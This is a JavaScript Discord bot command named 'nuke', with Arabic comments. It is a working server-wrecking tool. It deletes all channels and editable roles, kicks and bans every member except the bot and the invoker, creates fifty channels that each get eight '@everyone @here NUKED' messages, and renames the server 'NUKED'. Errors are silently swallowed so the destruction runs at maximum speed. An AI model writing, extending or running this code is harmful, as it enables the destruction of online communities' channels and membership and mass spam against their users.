const { SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('تخريب شامل بأقصى سرعة')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

  async execute(interaction) {
    const allowed = ['1342238662368296980']; // حط آي ديك
    if (!allowed.includes(interaction.user.id)) {
      return interaction.reply({ content: 'مش مسموح.', ephemeral: true });
    }

    await interaction.reply({ content: 'NUKE STARTED', ephemeral: true }).catch(() => {});

    const guild = interaction.guild;
    if (!guild) return;

    const me = interaction.client.user.id;
    const owner = interaction.user.id;

    // جلب كل حاجة مرة واحدة
    const [channels, roles, members] = await Promise.all([
      guild.channels.fetch().catch(() => new Map()),
      guild.roles.fetch().catch(() => new Map()),
      guild.members.fetch().catch(() => new Map()),
    ]);

    // ——— 1. مسح القنوات والرولات في نفس اللحظة ———
    const deleteChannels = [...channels.values()].map(ch =>
      ch.delete().catch(() => {})
    );

    const deleteRoles = [...roles.values()]
      .filter(r => r.id !== guild.id && r.editable)
      .map(r => r.delete().catch(() => {}));

    // ——— 2. طرد + حظر كل الأعضاء في نفس اللحظة ———
    const actions = [];
    for (const [, member] of members) {
      if (member.id === me || member.id === owner) continue;

      if (member.kickable) {
        actions.push(member.kick('nuke').catch(() => {}));
      }
      if (member.bannable) {
        actions.push(member.ban({ reason: 'nuke', deleteMessageSeconds: 0 }).catch(() => {}));
      }
    }

    // تشغيل كل عمليات المسح والطرد والحظر مع بعض
    await Promise.allSettled([
      ...deleteChannels,
      ...deleteRoles,
      ...actions,
    ]);

    // ——— 3. سبام قنوات بأقصى سرعة ———
    const spamPromises = [];
    for (let i = 0; i < 50; i++) {
      spamPromises.push(
        (async () => {
          try {
            const ch = await guild.channels.create({
              name: `nuked-${Math.random().toString(36).slice(2, 8)}`,
              type: ChannelType.GuildText,
            });
            // 8 رسايل دفعة واحدة
            await Promise.allSettled(
              Array.from({ length: 8 }, () =>
                ch.send('@everyone @here NUKED').catch(() => {})
              )
            );
          } catch {}
        })()
      );
    }

    await Promise.allSettled(spamPromises);

    // ——— 4. تغيير اسم السيرفر ———
    await guild.setName('NUKED').catch(() => {});
  },
};